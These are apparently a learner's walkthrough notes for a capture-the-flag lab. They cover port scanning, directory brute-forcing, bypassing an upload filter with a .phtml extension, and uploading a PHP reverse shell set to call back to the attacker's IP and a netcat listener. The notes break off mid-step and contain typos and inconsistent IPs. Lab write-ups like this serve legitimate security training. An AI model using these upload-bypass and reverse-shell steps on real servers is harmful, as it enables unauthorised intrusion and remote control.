<IP  >= remote ip =  10.10.121.171

nmap -sV <IP>

Identified open ports:

    21/tcp - FTP (vsftpd 3.0.3)
    22/tcp - SSH (OpenSSH 7.2p2 Ubuntu)
    139, 445/tcp - Samba (SMB service)
    3128/tcp - Squid proxy (3.5.12)
    3333/tcp - Apache HTTP Server (2.4.18 Ubuntu)
	
	you can open the web page in url =  'http://10.10.34.169:3333/'
	
Task 3:    Locating directories using Gobuster
------------------------------
Gobuster is a tool for brute-forcing URIs (directories and files), DNS subdomains, and virtual host names.  

 gobuster dir -u http://IP:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt

What is the directory that has an upload form page?
Try to open all the paths . you will find the uploa page in the next path:
http://IP:3333/internal/


  

-------------------------------------------
Now that you have found a form to upload files, 
( http:<ip>:3333/internal/ )
we can leverage this to upload and execute our payload, which will lead to compromising the web server.

    Answer the questions below:

    What common file type you'd want to upload to exploit the server is blocked? 

    Logically, the ideal would be to upload a .php file to execute code. Imagine it as a Trojan horse.

download file:
     https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
Before we proceed to test the upload form, we’ll need to change the IP address in the php reverse shell script. Set this to your attack machine’s IP address 
 You can also change the port if you’d like; this is a matter of preference. We just need to make sure that our listener is set to the same port so we will change it to  9001, A random port number above 9000


so the lines are :
  $ip = '10.10.231.94';  // CHANGE THIS   local IP not Remote IP
  $port = 9001;         // CHANGE THIS     A random port number above 9000

Next  start up a netcat listener so we will have a shell as soon as the php file is executed. 
Do this in a terminal:

 goto upload dir http://10.10.231.94:3333/internal
  and try to upload 
  the result is 'Extension not allowed'
  
  So this extensio is not allowed


Now we need t5o find wich extensio is allowed:
  To do this, we'll use BurpSuite. We’re going to use Intruder (used to automate custom attacks). To start, make a wordlist with the following extensions:

.php
.php3
.php4
.php5
.phtml

Qustion:
 What extension is allowed after running the above exercise?
answer:
  run the ape.py the answer is   phtml

 goto http://10.10.121.171:3333/internal/index.php
   and try to upload    'revershall.phtml'   and you'll get sucesss .
   

check http://10.10.121.171:3333/internal/uploads
the answer is :
         Index of /internal/uploads
         Name	               Last modified	Size	Description
         Parent Directory	 	- 	 
         revershall.phtml	2025-11-04 09:12 	4.0K	 


  -----------------   Getting a Reverse Shell ==============
We are going to use a PHP reverse shell as our payload. A reverse shell works by being called on the remote host and forcing this host to make a connection to you. So you'll listen for incoming connections, upload and execute your shell, which will beacon out to you to control! 

To gain remote access to this machine, follow these steps:

  a.  Edit the revershall.php file and edit the ip to be your local  ip  .
